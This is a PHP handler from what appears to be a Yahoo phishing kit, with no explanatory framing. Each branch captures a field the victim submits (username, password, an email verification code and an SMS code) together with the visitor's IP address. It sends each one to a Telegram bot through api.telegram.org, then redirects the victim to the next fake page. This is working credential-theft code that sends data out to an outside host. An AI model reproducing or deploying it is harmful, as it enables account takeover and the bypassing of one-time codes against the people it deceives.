<?php
function get_client_ip()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    if (!empty($_SERVER['HTTP_X_FORWARDED'])) return $_SERVER['HTTP_X_FORWARDED'];
    if (!empty($_SERVER['HTTP_FORWARDED_FOR'])) return $_SERVER['HTTP_FORWARDED_FOR'];
    if (!empty($_SERVER['HTTP_FORWARDED'])) return $_SERVER['HTTP_FORWARDED'];
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}

$ip = get_client_ip();

// Telegram
$key = "";
$id  = "";

if (isset($_POST['dato1'])) {
    $msg  = "➖➖➖[Yahoo]➖➖➖\n";
    $msg .= "✔️ YAHOO : <code>{$_POST['dato1']}</code>\n";
    $msg .= "➖➖➖INFO➖➖➖\n";
    $msg .= "🌐 IP : <code>{$ip}</code>\n";
    $msg .= "➖➖➖@vaceador➖➖➖\n";

    file_get_contents(
        "https://api.telegram.org/bot{$key}/sendMessage?" . http_build_query([
            'chat_id' => $id,
            'text' => $msg,
            'parse_mode' => 'HTML'
        ])
    );
    header("Location: ./../pswd.php");
    exit();
}

if (isset($_POST['dato2'])) {

    $msg  = "➖➖➖[Yahoo]➖➖➖\n";
    $msg .= "✔️ PASS : <code>{$_POST['dato2']}</code>\n";
    $msg .= "➖➖➖INFO➖➖➖\n";
    $msg .= "🌐 IP : <code>{$ip}</code>\n";
    $msg .= "➖➖➖@vaceador➖➖➖\n";

    file_get_contents(
        "https://api.telegram.org/bot{$key}/sendMessage?" . http_build_query([
            'chat_id' => $id,
            'text' => $msg,
            'parse_mode' => 'HTML'
        ])
    );

    header("Location: ./../seleccionar.php");
    exit();
}
if (isset($_POST['codemail'])) {

    $msg  = "➖➖➖[Yahoo]➖➖➖\n";
    $msg .= "✔️ MAIL : <code>{$_POST['codemail']}</code>\n";
    $msg .= "➖➖➖INFO➖➖➖\n";
    $msg .= "🌐 IP : <code>{$ip}</code>\n";
    $msg .= "➖➖➖@vaceador➖➖➖\n";

    file_get_contents(
        "https://api.telegram.org/bot{$key}/sendMessage?" . http_build_query([
            'chat_id' => $id,
            'text' => $msg,
            'parse_mode' => 'HTML'
        ])
    );

    header("Location: ./../seleccionar.php");
    exit();
}

if (isset($_POST['telefonoic'])) {

    $msg  = "➖➖➖[Yahoo]➖➖➖\n";
    $msg .= "✔️ SMS : <code>{$_POST['telefonoic']}</code>\n";
    $msg .= "➖➖➖INFO➖➖➖\n";
    $msg .= "🌐 IP : <code>{$ip}</code>\n";
    $msg .= "➖➖➖@vaceador➖➖➖\n";

    file_get_contents(
        "https://api.telegram.org/bot{$key}/sendMessage?" . http_build_query([
            'chat_id' => $id,
            'text' => $msg,
            'parse_mode' => 'HTML'
        ])
    );

    header("Location: ./../seleccionar.php");
    exit();
}
